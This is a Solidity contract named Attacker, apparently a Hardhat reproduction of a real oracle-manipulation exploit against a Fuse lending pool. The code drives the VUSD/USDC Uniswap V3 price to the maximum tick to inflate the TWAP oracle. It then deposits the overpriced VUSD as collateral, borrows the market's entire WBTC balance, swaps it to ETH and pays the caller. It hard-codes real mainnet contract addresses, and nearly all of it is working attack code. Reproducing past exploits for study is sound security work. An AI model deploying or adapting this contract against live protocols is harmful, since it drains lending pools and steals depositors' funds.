pragma solidity >=0.8.0;
import "hardhat/console.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "../interfaces/IERC20.sol";
import "../interfaces/IWETH.sol";
// same as Uniswap but 0.8.x compatible
import "../interfaces/INonfungiblePositionManager.sol";
import "../libs/UniswapMath.sol";

// this is like Compound's CToken interface
interface IFToken is IERC20 {
    function mint(uint256 mintAmount) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function underlying() external returns (address);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens)
        external
        returns (uint256[] memory);
}

contract Attacker {
    IERC20 public constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant VUSD =
        IERC20(0x677ddbd918637E5F2c79e164D402454dE7dA8619);
    IWETH public constant WETH =
        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // these are pool-23 specific, each pool gets a new deploy
    IFToken public constant fVUSD =
        IFToken(0x2914e8C1c2C54E5335dC9554551438c59373e807);
    IFToken public constant fWBTC =
        IFToken(0x0302F55dC69F5C4327c8A6c3805c9E16fC1c3464);
    IComptroller public constant comptroller =
        IComptroller(0xF53c73332459b0dBd14d8E073319E585f7a46434);

    // https://github.com/Uniswap/v3-periphery/blob/main/deploys.md
    // VUSD (token0) <> USDC (token1) pool
    IUniswapV3Pool public constant pool =
        IUniswapV3Pool(0x8dDE0A1481b4A14bC1015A5a8b260ef059E9FD89);
    ISwapRouter public constant swapRouter =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    INonfungiblePositionManager public constant nonfungiblePositionManager =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);

    constructor() {
        require(
            WETH.approve(address(swapRouter), type(uint256).max),
            "!approve"
        );
        require(
            USDC.approve(address(swapRouter), type(uint256).max),
            "!approve"
        );
    }

    function manipulateUniswapV3() external payable {
        // https://ethtx.info/mainnet/0x89d0ae4dc1743598a540c4e33917efdce24338723b0fabf34813b79cb0ecf4c5/
        // 1. buy 250k USDC with WETH
        buyUSDC();

        // Turns out these two steps are not needed, when buying up all VUSD, it automatically ends up at MAX_TICK
        // 2. Get a small amount of VUSD (exploiter did this through minter but we can just do a first small swap)
        // uint256 vusdBought = buyVUSD();
        // 3. Create LP position at max tick
        // provideLiquidity(vusdBought);

        // 4. Perform the swap such that we burn through the range orders up to our position at max tick
        console.log("=== Current price before swap ===");
        printCurrentPrice();
        buyAllVUSD();
        console.log("=== Current price after swap ====");
        printCurrentPrice();

        // refund left-over ETH
        WETH.withdraw(WETH.balanceOf(address(this)));
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    function buyUSDC() internal {
        WETH.deposit{value: msg.value}();

        uint256 wantUsdc = 250_000 * 1e6;
        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter
            .ExactOutputSingleParams({
                tokenIn: address(WETH),
                tokenOut: address(USDC),
                fee: 3000,
                recipient: address(this),
                deadline: 1e10,
                amountOut: wantUsdc,
                amountInMaximum: type(uint256).max,
                sqrtPriceLimitX96: 0
            });
        uint256 amountIn = swapRouter.exactOutputSingle(params);
    }

    // function buyVUSD() internal returns (uint256 vusdBought) {
    //     vusdBought = 1 * 1e18;
    //     ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter
    //         .ExactOutputSingleParams({
    //             tokenIn: address(USDC),
    //             tokenOut: address(VUSD),
    //             fee: 500,
    //             recipient: address(this),
    //             deadline: 1e10,
    //             amountOut: vusdBought,
    //             amountInMaximum: type(uint256).max,
    //             sqrtPriceLimitX96: 0
    //         });
    //     uint256 amountIn = swapRouter.exactOutputSingle(params);
    //     console.log(
    //         "buyVUSD: got %s VUSD for %s USDC",
    //         VUSD.balanceOf(address(this)),
    //         amountIn
    //     );
    // }

    function buyAllVUSD() internal {
        // we won't actually be able to buy up the entire VUSD.balanceOf(pool) balance, it'll be slightly less. I assume this is due to fees still in the contract or something
        // instead we use the sqrtPriceLimit at a max tick to search and buy up all liquidity up to this tick, s.t., in the end the new price will be at max tick
        // the sqrtPriceLimitX96 used here will end up being the sqrtPrice & currentTick of slot0, so pump it up to the maximum
        pool.swap(
            address(this), // receiver
            false, // zeroToOne (swap token0 to token1?)
            type(int256).max, // amount
            UniswapMath.getSqrtRatioAtTick(UniswapMath.MAX_TICK - 1), // sqrtPriceLimit
            "" // callback data
        );
    }

    // function provideLiquidity(uint256 vusdToUse) internal {
    //     vusdToUse = 1000;
    //     uint256 usdcToUse = 0; // same value, actual amounts used will be different
    //     console.log("vusdToUse", vusdToUse);
    //     // Approve the position manager
    //     require(
    //         VUSD.approve(address(nonfungiblePositionManager), vusdToUse),
    //         "!approve"
    //     );
    //     require(
    //         USDC.approve(address(nonfungiblePositionManager), usdcToUse),
    //         "!approve"
    //     );

    //     int24 TICK_SPACING = 10;
    //     int24 upperTick = UniswapMath.MAX_TICK - UniswapMath.MAX_TICK % TICK_SPACING;
    //     int24 lowerTick = upperTick - TICK_SPACING;
    //     // TODO: attacker provides (0, 1e5) liquidity at (-887260, -887250), not at +ticks. why, if we want the USDC/VUSD price to increase?
    //     // int24 lowerTick = -(UniswapMath.MAX_TICK - UniswapMath.MAX_TICK % TICK_SPACING);
    //     // int24 upperTick = lowerTick + TICK_SPACING;
    //     INonfungiblePositionManager.MintParams
    //         memory params = INonfungiblePositionManager.MintParams({
    //             // must be sorted correctly
    //             token0: address(VUSD),
    //             token1: address(USDC),
    //             fee: 500,
    //             // must have correct tick spacing
    //             tickLower: lowerTick,
    //             tickUpper: upperTick,
    //             amount0Desired: vusdToUse,
    //             amount1Desired: usdcToUse,
    //             amount0Min: 0,
    //             amount1Min: 0,
    //             recipient: address(this),
    //             deadline: 1e10
    //         });

    //     (
    //         uint256 tokenId,
    //         uint128 liquidity,
    //         uint256 amt0,
    //         uint256 amt1
    //     ) = nonfungiblePositionManager.mint(params);
    //     console.log("provideLiquidity: minted %s liquidity with %s VUSD, %s USDC", liquidity, amt0, amt1);
    // }

    /// second step of the attack where we deposit price-inflated VUSD as collateral
    /// and borrow other fuse assets
    function fuseAttack() external payable {
        printUniswapTwapPrice(600);

        // must enter fVUSD market such that it is counted as collateral
        address[] memory markets = new address[](1);
        markets[0] = address(fVUSD);
        // markets[1] = address(fWBTC);
        comptroller.enterMarkets(markets);

        // we should still have some VUSD
        // assume we want to provide 4M$ as VUSD in collateral
        // figure out how much we need to deposit
        uint256 vusdCollateral = (10**VUSD.decimals() * 4_000_000 * 1e6) /
            getUniswapTwapPrice(600);
        require(
            VUSD.balanceOf(address(this)) >= vusdCollateral,
            "not enough VUSD. wait one more block until price increases"
        );
        VUSD.approve(address(fVUSD), vusdCollateral);
        require(fVUSD.mint(vusdCollateral) == 0, "mint error");

        // borrow all WBTC
        IERC20 wbtc = IERC20(fWBTC.underlying());
        uint256 wbtcCash = wbtc.balanceOf(address(fWBTC));
        uint256 success = fWBTC.borrow(wbtcCash);
        require(success == 0, "borrow error");

        // change it to ETH
        wbtc.approve(address(swapRouter), type(uint256).max);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(wbtc),
                tokenOut: address(WETH),
                fee: 3000,
                recipient: address(this),
                deadline: 1e10,
                amountIn: wbtcCash,
                amountOutMinimum: 0, // should change this in prod
                sqrtPriceLimitX96: 0
            });
        uint256 wethReceived = swapRouter.exactInputSingle(params);
        WETH.withdraw(wethReceived);
        msg.sender.call{value: wethReceived}("");
    }

    /// returns TWAP price in 6 decimals
    function getUniswapTwapPrice(uint32 secondsAgo)
        internal
        view
        returns (uint256 price)
    {
        uint32[] memory secondsArr = new uint32[](2);
        secondsArr[0] = secondsAgo;
        (int56[] memory tickCumulatives, ) = pool.observe(secondsArr);
        // average ticks: latest tick - secondsAgo tick
        int24 tick = int24(
            (tickCumulatives[1] - tickCumulatives[0]) /
                int56(int256(secondsAgo))
        );
        // console.logInt(tick);
        // sqrt(token1/token0 price)
        uint160 sqrtPrice = UniswapMath.getSqrtRatioAtTick(tick);
        // convert to price, i.e. square it and divide by the 2**96 base, but keep it in token1.decimals - token0.decimals + 18 = 6
        price = UniswapMath.mulDiv(
            sqrtPrice,
            sqrtPrice,
            uint256(2**192) / 1e18
        );
    }

    // will be called when swapping USDC to VUSD in step 1.4
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        // Uniswap always does callback to its msg.sender, so we only receive the ones we started
        // still need to check that it originated from the v3 pool
        require(msg.sender == address(pool));
        // negative means we received, positive means we need to pay
        require(
            amount0Delta <= 0 && amount1Delta > 0,
            "should have swapped USDC to VUSD"
        );
        USDC.transfer(address(pool), uint256(amount1Delta));
    }

    receive() external payable {}

    function printUniswapTwapPrice(uint32 secondsAgo)
        public
        view
        returns (uint256 price)
    {
        price = getUniswapTwapPrice(secondsAgo);
        console.log("gmTWAP-Price:", price);
    }

    function printCurrentPrice() public view returns (uint256 price) {
        (uint160 sqrtRatioX96, int24 tick, , , , , ) = pool.slot0();
        price = UniswapMath.mulDiv(
            sqrtRatioX96,
            sqrtRatioX96,
            uint256(2**192) / 1e18
        );
        console.log("slot0: Price: %s\nTick:", price);
        console.logInt(tick);
    }
}
